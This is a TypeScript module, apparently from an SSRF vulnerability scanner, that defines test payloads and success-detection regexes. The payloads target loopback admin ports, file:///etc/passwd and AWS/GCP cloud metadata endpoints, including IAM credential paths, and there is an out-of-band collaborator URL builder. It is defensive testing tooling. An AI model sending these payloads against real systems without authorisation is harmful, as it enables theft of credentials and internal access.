export const SSRF_INTERNAL_ADMIN_PATH = "/admin";
export const SSRF_INTERNAL_ADMIN_PORT = 8377;
export const SSRF_INTERNAL_ADMIN_MARKER = "MCPF0RGE_INTERNAL_ADMIN_VISIBLE";

export interface SsrfPayload {
  url: string;
  category: "loopback" | "metadata" | "file" | "collaborator";
  signals: RegExp[];
}

/**
 * Deterministic first: our harness runs a local admin endpoint on :8377.
 * Cloud metadata probes only confirm when marker content is actually returned
 * (they intentionally do NOT rely on network reachability in CI).
 *
 * Echo-safety rule: a success signal must never be a substring of the payload
 * URL itself — otherwise any server that merely reflects its argument would be
 * flagged as "confirmed". (E.g. /computeMetadata/i is NOT a usable signal for
 * the GCP URL because the URL path contains it.)
 */
export const SSRF_PAYLOADS: SsrfPayload[] = [
  {
    url: `http://127.0.0.1:${SSRF_INTERNAL_ADMIN_PORT}${SSRF_INTERNAL_ADMIN_PATH}`,
    category: "loopback",
    signals: [new RegExp(SSRF_INTERNAL_ADMIN_MARKER)],
  },
  {
    url: "http://localhost:8377/admin",
    category: "loopback",
    signals: [new RegExp(SSRF_INTERNAL_ADMIN_MARKER)],
  },
  {
    url: "file:///etc/passwd",
    category: "file",
    signals: [/root:[x*]:0:0:/],
  },
  {
    url: "http://169.254.169.254/latest/meta-data/",
    category: "metadata",
    signals: [/^ami-id$/im, /instance-id/i, /iam\/security-credentials/i],
  },
  {
    url: "http://metadata.google.internal/computeMetadata/v1/",
    category: "metadata",
    signals: [/project-id/i, /instance\/id/i], // never /computeMetadata/i — that is part of the URL
  },
];

export function collaboratorPayload(base: string, token: string): SsrfPayload {
  return {
    url: `${base.replace(/\/$/, "")}/${token}`,
    category: "collaborator",
    signals: [new RegExp(token)],
  };
}
